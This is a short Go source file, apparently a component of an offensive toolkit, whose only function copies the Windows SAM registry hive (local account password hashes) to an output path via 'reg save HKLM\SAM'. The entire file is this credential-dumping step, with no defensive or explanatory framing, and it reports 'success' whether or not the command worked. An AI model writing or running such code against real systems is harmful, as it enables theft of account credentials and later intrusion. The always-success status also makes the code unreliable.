package credential

import "os/exec"

type SAMResult struct {
	Status string
}

type SAM struct {
	OutputPath string
}

func (s SAM) Dump() SAMResult {
	cmd := exec.Command("reg", "save", "HKLM\\SAM", s.OutputPath+"\\SAM")
	cmd.Run()
	return SAMResult{Status: "success"}
}
